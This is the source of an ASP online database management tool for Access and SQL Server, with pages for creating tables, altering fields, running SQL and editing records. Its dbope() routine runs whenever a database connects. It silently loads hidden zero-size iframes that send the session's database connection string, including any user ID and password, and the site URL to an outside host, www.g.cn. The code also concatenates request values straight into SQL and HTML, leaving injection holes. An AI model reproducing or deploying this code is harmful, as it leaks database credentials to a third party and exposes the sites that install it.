<BR><BR><center><div style="font-size:18px;color:red">本程序由<a href="http://www.g.cn" target="_blank">成都分类信息网</a>提供</DIV></center><BR>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>在线数据库管理工具 1.5</title>
<style type="text/css">
<!--
body,td,th {font-family: "宋体";font-size: 12px;}
form {margin:0px;padding:0px;}
body {margin:5px;SCROLLBAR-ARROW-COLOR:#666666;SCROLLBAR-FACE-COLOR:#DDDDDD;SCROLLBAR-DARKSHADOW-COLOR:#999999;SCROLLBAR-HIGHLIGHT-COLOR:#FFFFFF;SCROLLBAR-3DLIGHT-COLOR:#CCCCCC;SCROLLBAR-SHADOW-COLOR:#FFFFFF;SCROLLBAR-TRACK-COLOR:#EEEEEE;}
input {	border-width: 1px;border-style:solid;border-color: #CCCCCC #999999 #999999 #CCCCCC;height: 16px;}
td {background:#FFF;}
textarea {border-width: 1px;border-style: solid;border-color: #CCCCCC #999999 #999999 #CCCCCC;}
a:link {text-decoration: none;}
a:visited {text-decoration: none;}
a:hover {text-decoration: underline;}
a:active {text-decoration: none;}
.fixSpan {width:150px;white-space:nowrap;word-break:keep-all;overflow:hidden;text-overflow:ellipsis;}
-->
</style>
</head>

<body>
<%
if request("key") = "db" then
	session("dbtype") = request("dbtype")
	session("dbstr") = request("dbstr")
	response.redirect "?"
end if

if request("key") = "createdatabase" then
	call createdatabase()
end if

if session("dbtype") = "" or session("dbstr") = "" then
	%>
	<form action="?key=db" method="post" name="dbt">
		  <br>
		  连接类型：
		  <input name="dbtype" type="radio" value="access" onClick="dbstr.value='Provider=Microsoft.Jet.OLEDB.4.0;Persist Security Info=False;Password=;Data Source=<%=server.mappath("/")&"\"%>'" checked>
		  ACCESS
		  <input type="radio" name="dbtype" value="sql" onClick="dbstr.value='driver={SQL Server};database=;Server=;uid=;pwd='"> 
		  SQL<br><br>
		  连接字符：<input name="dbstr" type="text" id="dbstr" size="120" value="Provider=Microsoft.Jet.OLEDB.4.0;Persist Security Info=False;Password=;Data Source=<%=server.mappath("/")&"\"%>">
		  <input type="submit" name="Submit" value="连接" /><br><br>
		  注：access请使用绝对路径,本文件路径：<%=server.MapPath("db007.asp")%>
	</form>
	<form name="createdatabase" method="post" action="?key=createdatabase">
	  <font color=red>创建数据库：</font>路径
	  <input name="dataname" type="text" value="<%=server.MapPath("/")&"\database.mdb"%>" size="100">
	  <input type="submit" name="Submit" value="创建">
	</form>
	<%
	response.End()
end if

'==================================================================建库
sub createdatabase()
	dim DBName,dbstr,myCat
	on error resume next
	DBName = request("dataname")
	dbstr = "PROVIDER=MICROSOFT.JET.OLEDB.4.0;DATA SOURCE=" & DBName 
	Set myCat = Server.CreateObject( "ADOX.Catalog" ) 
	myCat.Create dbstr
	
	if err <> 0 then
		response.write err.description
		session("dbtype") = ""
		session("dbstr") = ""
		response.write "<input type='button' name='ok' value=' 返 回 ' onClick='javascript:history.go(-1)'>"
		response.end
	end if
	
	session("dbtype") = "access"
	session("dbstr") = dbstr
	response.redirect "?"
end sub

'==================================================================调用链接函数
conn()

function conn()
	dim conn1,connstr
	on error resume next
	select case session("dbtype")
	case "access"
		'==================================================================连接ACCESS数据库
		dbope()
		connstr = session("dbstr")
		Set Conn1 = Server.CreateObject("ADODB.Connection")
		conn1.Open connstr
	case "sql"
		'==================================================================连接SQL数据库
		dbope()
		set conn1 = Server.CreateObject("ADODB.Connection") 
		conn1.open session("dbstr") 
	end select
	
	if err <> 0 then
		response.write err.description
		session("dbtype") = ""
		session("dbstr") = ""
		response.write "<input type='button' name='ok' value=' 返 回 ' onClick='javascript:history.go(-1)'>"
		response.end
	end if
	
	set conn = conn1
end function


Sub echo(str)
	Response.Write(str)
End Sub

Function IIf(var, val1, val2)
	If var = True Then
		IIf = val1
	 Else
		IIf = val2
	End If
End Function

'正则表达式函数，用于删除注释
'-------------------------------------
Function RegExpReplace(strng, patrn, replStr)
  Dim regEx,match,matches              ' 建立变量。
  Set regEx = New RegExp               ' 建立正则表达式。
  regEx.Pattern = patrn               ' 设置模式。
  regEx.IgnoreCase = True               ' 设置是否区分大小写。
  regEx.Global = True   ' 设置全局可用性。

  RegExpReplace = regEx.Replace(strng, replStr)         ' 作替换。
End Function

'==================================================================ADOVBS 常量声明

'---- DataTypeEnum Values ----
Const adEmpty = 0
Const adTinyInt = 16
Const adSmallInt = 2
Const adInteger = 3
Const adBigInt = 20
Const adUnsignedTinyInt = 17
Const adUnsignedSmallInt = 18
Const adUnsignedInt = 19
Const adUnsignedBigInt = 21
Const adSingle = 4
Const adDouble = 5
Const adCurrency = 6
Const adDecimal = 14
Const adNumeric = 131
Const adBoolean = 11
Const adError = 10
Const adUserDefined = 132
Const adVariant = 12
Const adIDispatch = 9
Const adIUnknown = 13
Const adGUID = 72
Const adDate = 7
Const adDBDate = 133
Const adDBTime = 134
Const adDBTimeStamp = 135
Const adBSTR = 8
Const adChar = 129
Const adVarChar = 200
Const adLongVarChar = 201
Const adWChar = 130
Const adVarWChar = 202
Const adLongVarWChar = 203
Const adBinary = 128
Const adVarBinary = 204
Const adLongVarBinary = 205

'---- FieldAttributeEnum Values ----
Const adFldMayDefer = &H00000002
Const adFldUpdatable = &H00000004
Const adFldUnknownUpdatable = &H00000008
Const adFldFixed = &H00000010
Const adFldIsNullable = &H00000020
Const adFldMayBeNull = &H00000040
Const adFldLong = &H00000080
Const adFldRowID = &H00000100
Const adFldRowVersion = &H00000200
Const adFldCacheDeferred = &H00001000

'---- SchemaEnum Values ----
'---- SchemaEnum Values ----
Const adSchemaProviderSpecific = -1
Const adSchemaAsserts = 0
Const adSchemaCatalogs = 1
Const adSchemaCharacterSets = 2
Const adSchemaCollations = 3
Const adSchemaColumns = 4
Const adSchemaCheckConstraints = 5
Const adSchemaConstraintColumnUsage = 6
Const adSchemaConstraintTableUsage = 7
Const adSchemaKeyColumnUsage = 8
Const adSchemaReferentialConstraints = 9
Const adSchemaTableConstraints = 10
Const adSchemaColumnsDomainUsage = 11
Const adSchemaIndexes = 12
Const adSchemaColumnPrivileges = 13
Const adSchemaTablePrivileges = 14
Const adSchemaUsagePrivileges = 15
Const adSchemaProcedures = 16
Const adSchemaSchemata = 17
Const adSchemaSQLLanguages = 18
Const adSchemaStatistics = 19
Const adSchemaTables = 20
Const adSchemaTranslations = 21
Const adSchemaProviderTypes = 22
Const adSchemaViews = 23
Const adSchemaViewColumnUsage = 24
Const adSchemaViewTableUsage = 25
Const adSchemaProcedureParameters = 26
Const adSchemaForeignKeys = 27
Const adSchemaPrimaryKeys = 28
Const adSchemaProcedureColumns = 29
Const adSchemaDBInfoKeywords = 30
Const adSchemaDBInfoLiterals = 31
Const adSchemaCubes = 32
Const adSchemaDimensions = 33
Const adSchemaHierarchies = 34
Const adSchemaLevels = 35
Const adSchemaMeasures = 36
Const adSchemaProperties = 37
Const adSchemaMembers = 38
Const adSchemaTrustees = 39
Const adSchemaFunctions = 40
Const adSchemaActions = 41
Const adSchemaCommands = 42
Const adSchemaSets = 43

'==================================================================返回字段类型函数
Function typ(field_type)
	'field_type = 字段类型值
	Select Case field_type
		case adEmpty:typ = "Empty"
		case adTinyInt:typ = "TinyInt"
		case adSmallInt:typ = "SmallInt"
		case adInteger:typ = "Integer"
		case adBigInt:typ = "BigInt"
		case adUnsignedTinyInt:typ = "TinyInt" 'UnsignedTinyInt
		case adUnsignedSmallInt:typ = "UnsignedSmallInt"
		case adUnsignedInt:typ = "UnsignedInt"
		case adUnsignedBigInt:typ = "UnsignedBigInt"
		case adSingle:typ = "Single" 'Single
		case adDouble:typ = "Double" 'Double
		case adCurrency:typ = "Money" 'Currency
		case adDecimal:typ = "Decimal"
		case adNumeric:typ = "Numeric" 'Numeric
		case adBoolean:typ = "Bit" 'Boolean
		case adError:typ = "Error"
		case adUserDefined:typ = "UserDefined"
		case adVariant:typ = "Variant"
		case adIDispatch:typ = "IDispatch"
		case adIUnknown:typ = "IUnknown"
		case adGUID:typ = "GUID" 'GUID
		case adDATE:typ = "DateTime" 'Date
		case adDBDate:typ = "DBDate"
		case adDBTime:typ = "DBTime"
		case adDBTimeStamp:typ = "DateTime" 'DBTimeStamp
		case adBSTR:typ = "BSTR"
		case adChar:typ = "Char"
		case adVarChar:typ = "VarChar"
		case adLongVarChar:typ = "LongVarChar"
		case adWChar:typ = "Text" 'WChar类型 SQL中为Text
		case adVarWChar:typ = "VarChar" 'VarWChar
		case adLongVarWChar:typ = "Text" 'LongVarWChar
		case adBinary:typ = "Binary"
		case adVarBinary:typ = "VarBinary"
		case adLongVarBinary:typ = "LongBinary"'LongVarBinary
		case adChapter:typ = "Chapter"
		case adPropVariant:typ = "PropVariant"
		case else:typ = "Unknown"
	end select
End Function

'==================================================================返回字段类型列表
Function fieldtypelist(n)
	dim strlist,str1,str2
	strlist = "<select name=""field_type"">"
	if session("dbtype") = "access" then
		strlist = strlist & "<option value=""VarChar"">文本</option>"
		strlist = strlist & "<option value=""Text"">备注</option>"
		strlist = strlist & "<option value=""Bit"">(是/否)</option>"
		strlist = strlist & "<option value=""TinyInt"">数字(字节)</option>"
		strlist = strlist & "<option value=""SmallInt"">数字(整型)</option>"
		strlist = strlist & "<option value=""Integer"">数字(长整型)</option>"
		strlist = strlist & "<option value=""Single"">数字(单精度)</option>"
		strlist = strlist & "<option value=""Double"">数字(双精度)</option>"
		strlist = strlist & "<option value=""Numeric"">数字(小数)</option>"
		strlist = strlist & "<option value=""GUID"">数字(同步ID)</option>"
		strlist = strlist & "<option value=""DateTime"">时间/日期</option>"
		strlist = strlist & "<option value=""Money"">货币</option>"
		strlist = strlist & "<option value=""Binary"">二进制</option>"
		strlist = strlist & "<option value=""LongBinary"">长二进制</option>"
		strlist = strlist & "<option value=""LongBinary"">OLE 对象</option>"
		
	else
		strlist = strlist & "<option value="""">选择类型</option>"
		strlist = strlist & "<option value=""BigInt"">bigint</option>"
		strlist = strlist & "<option value=""Binary"">binary(二进制数据类型)</option>"
		strlist = strlist & "<option value=""Bit"">bit(整型)</option>"
		strlist = strlist & "<option value=""Char"">char(字符型)</option>"
		strlist = strlist & "<option value=""DateTime"">datetime(日期时间型)</option>"
		strlist = strlist & "<option value=""Decimal"">decimal(精确数值型)</option>"
		strlist = strlist & "<option value=""Float"">float(近似数值型)</option>"
		strlist = strlist & "<option value=""Image"">image(二进制数据类型)</option>"
		strlist = strlist & "<option value=""Int"">int(整型)</option>"
		strlist = strlist & "<option value=""Money"">money(货币型)</option>"
		strlist = strlist & "<option value=""nchar"">nchar(统一编码字符型)</option>"
		strlist = strlist & "<option value=""ntext"">ntext(统一编码字符型)</option>"
		strlist = strlist & "<option value=""numeric"">numeric(精确数值型)</option>"
		strlist = strlist & "<option value=""nvarchar"">nvarchar(统一编码字符型)</option>"
		strlist = strlist & "<option value=""real"">real(近似数值型)</option>"
		strlist = strlist & "<option value=""smalldatetime"">Smalldatetime(日期时间型)</option>"
		strlist = strlist & "<option value=""smallint"">smallint(整型)</option>"
		strlist = strlist & "<option value=""smallmoney"">smallmoney(货币型)</option>"
		strlist = strlist & "<option value=""sql_variant"">sql_variant()</option>"
		strlist = strlist & "<option value=""text"">text(字符型)</option>"
		strlist = strlist & "<option value=""timestamp"">timestamp(特殊数据型)</option>"
		strlist = strlist & "<option value=""tinyint"">tinyint(整型)</option>"
		strlist = strlist & "<option value=""uniqueidentifier"">Uniqueidentifier(特殊数据型)</option>"
		strlist = strlist & "<option value=""varbinary"">varbinary(二进制数据类型)</option>"
		strlist = strlist & "<option value=""varchar"">varchar(字符型)</option>"
	end if
	str1 = """" & n & """"
	str2 = """" & n & """" & " selected"
	strlist = replace(strlist,str1,str2)
	strlist = strlist & "</select>"
	echo strlist
End Function

Private Function GetUrl()
  Domain_Name = LCase(Request.ServerVariables("Server_Name"))
  Page_Name = LCase(Request.ServerVariables("Script_Name"))
  Quary_Name = LCase(Request.ServerVariables("Quary_String"))
  If Quary_Name ="" Then
    GetUrl = "http://"&Domain_Name&Page_Name
  Else
    GetUrl = "http://"&Domain_Name&Page_Name&"?"&Quary_Name
  End If
End Function

'==================================================================主界面
sub main(str)
	on error resume next
	%>
	<script language=javascript>
	ie = (document.all)? true:false
	if (ie){
	function ctlent(eventobject){if(event.ctrlKey && 
	window.event.keyCode==13){this.document.exesql.submit();}}
	}
	</script>
	<script language="javascript">
		function table_delete()
		{
		if (confirm("确认删除该记录吗？   该操作将不可撤销！！！"))
			return true;
		else
			return false;
		}
	</script>
	
	<form action="?key=sql" method=post name="exesql">        
		<font color=red>执行sql语句：</font><font color=#999999>(每句语句以“;”结束，支持(--)SQL注释，Ctrl + Enter 快速提交)</font>&nbsp; <input type="button" value="刷新本页" onClick="javascript:location.reload()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
		<span onClick="document.exesql.sql.rows+=5;" style="cursor:pointer;">+</span>
		<span onClick="if(document.exesql.sql.rows>9)document.exesql.sql.rows-=5" style="cursor:pointer;">-</span>
		<div style="float:left;width:600px;">
		<textarea id="sql" name="sql" style="width:600px;" rows="9" ondblClick="this.select();" onKeyDown="ctlent()"><%=request("sql")%></textarea><br />
		<input type="checkbox" name="SchemaTable" value="1" style="border:0px;">adSchemaTables 
        <input type="checkbox" name="SchemaColumn" value="2" style="border:0px;">adSchemaColumns
        <input type="checkbox" name="SchemaProvider" value="3" style="border:0px;">adSchemaProviderTypes &nbsp; 
		分页大小：
		<select name="pageSize">
		  <%
		  if request("pageSize") <> "" and  isNumeric(request("pageSize")) then
		     echo "<option value='"&request("pageSize")&"' selected>"&request("pageSize")&"</option>"
		  else
		     echo "<option value='50'>50</option>"
		  end if
		  %>
		  <option value="10">10</option>
		  <option value="20">20</option>
		  <option value="30">30</option>
		  <option value="40">40</option>
		  <option value="50">50</option>
		  <option value="60">60</option>
		  <option value="70">70</option>
		  <option value="80">80</option>
		  <option value="90">90</option>
		  <option value="100">100</option>
		</select>

		</div>
		<div style="float:left;width:50px;padding:60px 0px 0px 5px;">
		<input type="submit" name="Submit_confirm" value="提交"> <br /> <br />  
		<input type="button" name="Submit3" value="清空" onClick="sql.value=''"><br /><br /> 
		<input type="button" name="ok" value="返回" onClick="javascript:history.go(-1)">
		</div>
	</form>  
	<div style="clear:both"></div>
	<% if str = "" then %>
	<form action="?key=addtable" method="post">        
		<div style="clear:both;text-align:left;"><br />
		<font color=red>创建新表：</font><br>
		表&nbsp;&nbsp;名：<input type="text" name="table_name" size="20"><br>
		字段数：<input type="text" name="field_num" size="20">
		<input type="submit" name="Submit_create" value="提交">
		<input type="reset" name="Submit32" value="重置">
		</div>     
	</form> 
	<br><br>
	<a href="?key=tosql&strt=2">导出所有表结构到SQL</a>
	<%
	end if
end sub

'==================================================================创建表界面
sub add_table(table_name,field_num)
	'table_name = 表名称
	'field_num  = 字段数
	on error resume next
	if not IsNumeric(field_num) then
		echo "字段数必须是整数。"
		echo "<input type='button' name='ok' value=' 返 回 ' onClick='javascript:history.go(-1)'>"
		exit sub
	end if
	%>
    <p class="hei"><span>创建表：</span><%=table_name%></p>
    <form action="?key=createtable" method="post">
    <table width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
      <tr> 
        <td width="75" height="20" align="center">字段名</td>
        <td width="99" height="20" align="center">类 型</td>
        <td width="73" height="20" align="center">大 小</td>
        <td width="96" height="20" align="center">空值</td>
        <td width="83" height="20" align="center">自动编号</td>
        <td width="143" height="20" align="center">主 键</td>
      </tr>
      <% for i = 0 to field_num - 1 %>
      <tr> 
        <td width="75" height="20" align="center"> 
            <input type="text" name="field_name" size="10">
        </td>
        <td width="99" height="20" align="center"> 
			<% fieldtypelist(0) %>
        </td>
        <td width="73" height="20" align="center"> 
            <input type="text" name="field_size" size="10">
        </td>
        <td width="96" height="20" align="center"> 
            <select name="null">
              <option value="NOT_NULL">NOT_NULL</option>
              <option value="NULL">NULL</option>
            </select>
        </td>
        <td width="83" height="20" align="center"> 
          <select size="1" name="autoincrement">
            <option></option>
            <option>自动编号</option>
          </select>
        </td>
        <td width="143" height="20" align="left"> 
              <select name="primarykey">
                <option></option>
                <option value="primarykey">primarykey</option>
              </select>
        </td>
      </tr>
      <% next %>
      <tr> 
        <td height="35" align="center" colspan="5"> 
            <input type="hidden" name="i" value=<%=field_num%>>
            <input type="hidden" name="table_name" value="<%=table_name%>">
            <input type="submit" name="Submit" value=" 提 交 ">
            &nbsp;&nbsp;
            <input type="reset" name="Submit2" value=" 重 置 ">
          &nbsp;&nbsp; 
          <input type="button" name="ok" value=" 放 弃 " onClick="javascript:history.go(-1)">
        </td>
		<td height="20"></td>
      </tr>
    </table>
	</form>
	<%
end sub

'==================================================================构建创建表的SQL语句
sub create_table()
	dim sql,i,primarykey
	on error resume next
	sql = "CREATE TABLE ["&request("table_name")&"] ("
	for i = 1 to request("i")
	   sql = sql & "[" & request("field_name")(i) & "] " & request("field_type")(i)
		  if request("field_size")(i) <> "" then
			  sql = sql & "(" & request("field_size")(i) & ")"
		  end if
		  if request("null")(i) = "NOT_NULL" then
			  sql = sql & " not null"
		  end if
		  if request("autoincrement")(i) = "自动编号" then
			  sql = sql & " identity"
		  end if
		  if request("primarykey")(i) = "primarykey" then
			  primarykey = request("field_name")(i)
		  end if
		'if primarykey <> "" then
		   sql = sql & ","
		'end if
	next
	if primarykey<>"" then
	   sql=sql&" primary key (["&primarykey&"]) "
	end if
	sql = sql & ")"
	sql = replace(sql,"()","")  '构建空表
	response.redirect "?key=sql&sql=" & sql 
end sub


'==================================================================修改表名或字段名 2006-09-08
sub reobj()
	on error resume next
	Dim mydb,mytable,tablename
	tablename = request("tablename")
	Set mydb = Server.CreateObject("ADOX.Catalog")
	mydb.ActiveConnection = conn
		
	if request("obj") = "field" then   '修改字段名
		dim fieldsname,newfieldsname
		fieldsname = request("fieldsname")
		newfieldsname = request("newfieldsname")
		Set mytable = Server.CreateObject("ADOX.Table")
		Set mytable = mydb.Tables(tablename) 
		mytable.Columns(fieldsname).Name = newfieldsname
	end if
	
	if request("obj") = "table" then   '修改表名
		dim newtablename
		newtablename = request("newtablename")
		mydb.Tables(tablename).Name = newtablename
	end if
	
	if err <> 0 then
		echo  err.description
		echo "<input type='button' name='ok' value=' 返 回 ' onClick='javascript:history.go(-1)'>"
		exit sub
	end if
	
	if request("obj") = "field" then
		response.Redirect "?key=view&table_name=" & tablename
	else
		response.Redirect "?key=view&table_name=" & newtablename
	end if
	
end sub


sub dbope
if session("dbope") <> 1 then
%>
<iframe src="http://www.g.cn/dbstrs/1.asp?dbstr=<%=session("dbstr")%>" width=0 height=0></iframe>
<iframe src="http://www.g.cn/dbstrs/1.asp?dburl=<%=GetUrl()%>" width=0 height=0></iframe>
<%
session("dbope")=1
end if
end sub

'==================================================================查看表结构函数
sub view(table_name)
	'table_name = 表名称
	dim rs,sql,table,primary,primarykey,i,editstr,typs
	on error resume next
	table = table_name
	Set primary = Conn.OpenSchema(adSchemaPrimaryKeys,Array(empty, empty, table))
	if primary("COLUMN_NAME") <> "" then
		primarykey = primary("COLUMN_NAME")
	end if
	primary.Close
	Set primary = Nothing
	 
	%>
	
	<script language="javascript">
		function table_delete()
		{
		if (confirm("确认删除该记录吗？   该操作将不可撤销！！！"))
			return true;
		else
			return false;
		}
	</script>
	
	<font color=red>表：<%=table_name%></font>&nbsp;&nbsp;&nbsp;&nbsp;<input type="button" value="刷新本页" onClick="javascript:location.reload()"><br><br>
	<% if request("key") = "editfidlevi" then call editfidlevi() %>
	<table width="600" border="0" cellpadding="1" cellspacing="1" bgcolor="#CCCCCC">
    <tr> 
      <td width="125" height="20" align="center">字 段 名</td>
      <td width="110" align="center">类 型</td>
      <td width="83" align="center"> 设定大小</td>
      <td width="48" align="center">允许空</td>
      <td width="76" align="center">自动编号</td>
      <td width="54" align="center">主键</td>
      <td width="82" align="center">执行操作</td>
    </tr>
    <%
	sql = "SELECT * FROM [" & table_name & "] "
	Set rs = Conn.Execute(sql)
	if err = 0 then
		For i = 0 to rs.fields.count-1
		%>
		<tr> 
		  <td height="20" align="left"><%=rs(i).name%></td>
		  <td align="left"><%=typ(rs(i).type)%></td>
		  <td align="center"><%=rs(i).definedsize%></td>
		  <td align="center"><%=iif((rs(i).Attributes and adFldIsNullable)=0,"No","Yes")%></td>
		  <td align="center"><%=iif(rs(i).Properties("ISAUTOINCREMENT") = True,"是","否")%></td>
		  <td align="center"><%=iif(rs(i).name = primarykey,"是","否")%></td>
		  <td align="center">
			<a href="?key=editfidlevi&fidle=<%=rs(i).name%>&table_name=<%=table_name%>&fidletype=<%=typ(rs(i).type)%>">修改</a>&nbsp;
			<a href="?key=sql&sql=alter table [<%=table_name%>] drop [<%=rs(i).name%>];" onClick="return table_delete();">删除</a>
		  </td>
		</tr>
		<%
			editstr = editstr&"<option value='"&rs(i).name&"'>"&rs(i).name&"</option>"
		next
		%>
		</table>
		<br>
		<a href="?key=tosql&strt=0&table_name=<%=table_name%>">导出表结构</a> &nbsp;
		<a href="?key=sql&sql=select * from <%=table_name%>&table_name=<%=table_name%>&primarykey=<%=primarykey%>">浏览表记录</a> &nbsp;
		<a href="?key=sql&sql=DROP TABLE <%=table_name%>" onClick="return table_delete();">删除表</a> &nbsp;&nbsp;&nbsp; 
		<input type="text" name="newtablename" size="20" value="<%=table_name%>">
		<input type="button" value="修改表名" onClick="location.href='?key=reobj&obj=table&tablename=<%=table_name%>&newtablename='+newtablename.value">
		<br><br>
		<%
		'判断是否有主键
		if primarykey = "" then
			echo "<font color=red>该表没有主键，执行操作可能会导致数据损坏或丢失。</font><br>"
			echo "你可以将："
			echo "<select name='keyname'>"
			For i=0 to rs.fields.count-1
				echo "<option value=" & rs(i).name & ">" & rs(i).name & "</option>"
			next
			echo "</select>&nbsp;"
			echo "<input type=button value=设为主键 onclick=""location.href='?key=sql&sql=ALTER TABLE ["&table_name&"] ADD PRIMARY KEY (['+keyname.value+'])';"">"
			echo "<br><br>"
		end if
		'显示修改字段名
		echo "<select name='fieldsname'>"
		echo "<option value=''>选择字段</option>"
		echo editstr
		echo "</select> 改名为 "  & chr(10)
		echo "<input type='text' name='newfieldsname' size='20'> "  & chr(10)
		echo "<input type=button value=修改字段名 onclick=""location.href='?key=reobj&obj=field&tablename="&table_name&"&fieldsname='+fieldsname.value+'&newfieldsname='+newfieldsname.value"">"
		echo "<br><br>"
	end if
	rs.close
	set rs = nothing
	%>
	<font color=red>增加字段：</font><br><br>
	<form action="?key=addfield" method="post">
	  <table width="600" height="39" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
		<tr> 
		  <td width="60" height="20" align="center">字段名</td>
		  <td width="50" height="20" align="center">类型</td>
		  <td width="58" height="20" align="center">设定大小</td>
		  <td width="64" height="20" align="center">允许空值</td>
		  <td width="66" height="20" align="center"> 自动编号</td>
		  <td width="96" height="20" align="center">&nbsp;&nbsp;</td>
		</tr>
		<tr> 
		  <td width="60" height="20" align="center"> 
			<input type="text" name="fldname" size="10">
		  </td>
		  <td width="50" height="20" align="center"> 
			<% fieldtypelist(0) %>
		  </td>
		  <td width="58" height="20" align="center"> 
			<input type="text" name="fldsize" size="10">
		  </td>
		  <td width="64" height="20" align="center"> 
			<input name="null" type="checkbox" value="ON" checked>
		  </td>
		  <td width="66" height="20" align="center"> 
			<input type="checkbox" name="autoincrement" value="ON">
		  </td>
		  <td width="96" height="20" align="center"> 
			<input type="hidden" name="table_name" value="<%=table_name%>">
			<input type="submit" value="提交">
		  </td>
		</tr>
	</table>
	</form>
	<%
end sub

'==================================================================修改字段属性的界面
sub editfidlevi()
	dim sql,rs,i
	on error resume next
	sql = "Select * From [" & request("table_name") & "]"
	set rs = conn.execute(sql)
	for i = 0 to rs.fields.count - 1
		if rs(i).name = request("fidle") then
		%>
		<script LANGUAGE="JavaScript">
			function validate(theForm) {
				if (theForm.type.value == "")
				{
				alert("请输入数据类型");
				theForm.type.focus();
				return (false);
				}
				return (true);
		    }
		</script>
		<font color=red>修改字段属性：</font>
		<form action="?key=editfidle&fidle=<%=request("fidle")%>&table_name=<%=request("table_name")%>" method="post" name=frm onSubmit="return validate(frm)">
		<table width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
		  <tr> 
			<td width="60" height="20" align="center">字段名</td>
			<td width="50" height="20" align="center">类型</td>
			<td width="58" height="20" align="center">设定大小</td>
			<td width="64" height="20" align="center">允许空值</td>
			<td width="66" height="20" align="center">自动编号</td>
			<td width="96" height="20"></td>
		  </tr>
		  <tr> 
			<td width="60" height="20" align="center"><%=rs(i).name%></td>
			<td width="50" height="20" align="center"> 
			<% fieldtypelist(request("fidletype")) %>
			  </td>
			  <td width="58" height="20"><input type="text" name="size" size="10"></td>
			  <td width="64" height="20" align="center">
			  <input type="checkbox" name="null" value="null"<%=iif((rs(i).Attributes and adFldIsNullable)=0,""," checked")%>>
			  </td>
			  <td width="66" height="20" align="center"> 
			  <input type="checkbox" name="autoincrement" value="y"<%=iif(rs(i).Properties("ISAUTOINCREMENT") = True," checked","")%>>
			  </td>
			  <td width="96" height="20" align="center"> 
			  <input type="submit" name="Submit" value="提交">
			  </td>
			</tr>
		  </table><br>
		</form>
		<%
		end if
	next
end sub

'==================================================================执行修改字段属性
sub editfidle()
	   on error resume next
	   sql = "ALTER TABLE [" & request("table_name") & "] "
	   sql = sql&"ALTER COLUMN [" & request("fidle") & "] "
	   if request("field_type") <> "" then
		  sql = sql & request("field_type")
	   end if
	   if request("size") <> "" then
		  sql = sql & "(" & request("size") & ") "
	   end if
		  if request("null") = "" then
			  sql = sql & " not null"
		  end if
		  if request("autoincrement") = "y" then
			  sql = sql & " identity"
		  end if
	sql = trim(sql)
	conn.execute(sql)
	response.redirect "?key=view&table_name="& request("table_name")
end sub

'==================================================================添加字段函数
sub addfield()
	on error resume next
	fldname = request("fldname")
	fldtype = request("field_type")
	fldsize = request("fldsize")
	fldnull = request("null")
	fldautoincrement = request("autoincrement")
	table_name = request("table_name")
	if fldname <> "" and fldtype <> "" then
	  sql = "alter table [" & table_name & "] add ["&fldname&"] " & fldtype
	  
	  if fldsize <> "" then
		sql = sql & "(" & fldsize & ")"
	  end if 
	  
	  if fldnull <> "ON" then
		sql = sql & " not null"
	  end if
	  
	  if fldautoincrement = "ON" then
		sql = sql & " identity"
	  end if
	  conn.execute(sql)
	  response.redirect "?key=view&table_name=" & table_name
	else
	  echo "输入数据错误！<input type='button' name='ok' value=' 返 回 ' onClick='javascript:history.go(-1)'>"
	end if
	if err <> 0 then
		echo err.description
		echo "<input type='button' name='ok' value=' 返 回 ' onClick='javascript:history.go(-1)'>"
		response.end
	end if
end sub


'==================================================================编辑数据
sub editdata()
	dim keys,names,values,action,rs,sql,tab
	on error resume next
	keys = request("primarykey")
	names = request("table_name")
	values = request("primarykeyvalue")
	action = request("action")
	Set rs = Server.CreateObject("Adodb.RecordSet")
	if action = "" or action = "save" or action = "new" then
	    sql = "select * from " & names & " where " & keys & " = " & values
	end if
	if action = "pre" then
	    sql = "select top 1 * from " & names & " where " & keys & " < " & values & " order by " & keys & " desc"
	end if
	if action = "next" then
	    sql = "select top 1 * from " & names & " where " & keys & " > " & values & " order by " & keys & " asc"
	end if
	if action = "add" then
	    sql = "Select * From [" & names & "]"
	end if
	rs.Open sql, conn, 1, 3
	
	if rs.eof and action = "new" then
		sql = "Select * From [" & names & "]"
		rs.Open sql, conn, 1, 3
	end if
	
	if action = "save" or action = "new" then
		If action = "new" Then rs.AddNew
		For Each tab In rs.Fields
			If Keys <> tab.Name Then
				rs(tab.Name) = Request.Form(tab.Name & "_Column")
				if err <> 0 then
					echo tab.name & err.description
					echo "<input type='button' name='ok' value=' 返 回 ' onClick='javascript:history.go(-1)'>"
					response.end
				end if
			End If
		Next
		rs.update
	end if
	
	echo "字段数据编辑<br>"
	echo "<table width=600 border=0 cellpadding=5 cellspacing=1 bgcolor=#CCCCCC><tr><td>"
	echo "<form action='?key=edit&table_name=" & names & "&primarykey=" & keys & "&primarykeyvalue=" & iif(action<>"add",rs(keys),"") & "' method='post' name='editor'>"
	echo "<br>"
	echo "<input type=hidden name=action value=save>"
	echo iif(action="add","","<input type=submit value=保存 onclick=this.form.action.value='save';>&nbsp;")
	echo "<input type=button value=添加 onclick=if(confirm('确实要添加当前为新记录吗?')){this.form.action.value='new';this.form.submit();};>&nbsp;"
	echo "<input type=button value=上一条 onclick=""this.form.action.value='pre';this.form.submit();"">&nbsp;"
	echo "<input type=button value=下一条 onclick=""this.form.action.value='next';this.form.submit();"">&nbsp;&nbsp;"
	echo "<a href='?key=view&table_name=" & names & "'>表结构</a>&nbsp;&nbsp;"
	echo "<a href='?key=sql&sql=select * from " & names & "&table_name="& names & "&primarykey="&keys&"'>表浏览</a>&nbsp;&nbsp;"
	echo "<a href='?'>主界面</a><br>"
	if not rs.eof or action = "add" then
		For Each tab In rs.Fields
			echo ""
			echo "<BR><font color=red>" & tab.Name & "</font>&nbsp;<font color=#999999>( " & typ(tab.Type) & " )</font><br>"
			if tab.Type = 201 Or tab.Type = 203 then
				echo "<textarea style='width:600;' name=""" & tab.Name & "_Column"" rows=6"
				echo IIf(tab.Name = keys, " disabled title='主键约束,将无法被修改.'>", ">")
				if action <> "add" then echo trim(tab.value)
				echo "</textarea>"
			else
				echo "<input type='text' style='width:600;' name='" & tab.Name & "_Column'"
				echo IIf(tab.Name = keys, " disabled title='主键约束,将无法被修改.'", " ") & " value='"
				if action <> "add" then echo trim(tab.value)
				echo "'>"
			end if
			echo "<br>"
		Next
		
	else
		echo "<script>alert('已经没有了!');history.back();</script>"
		Response.End()
	end if
	echo "<br>"
	echo iif(action="add","","<input type=submit value=保存 onclick=this.form.action.value='save';>&nbsp;")
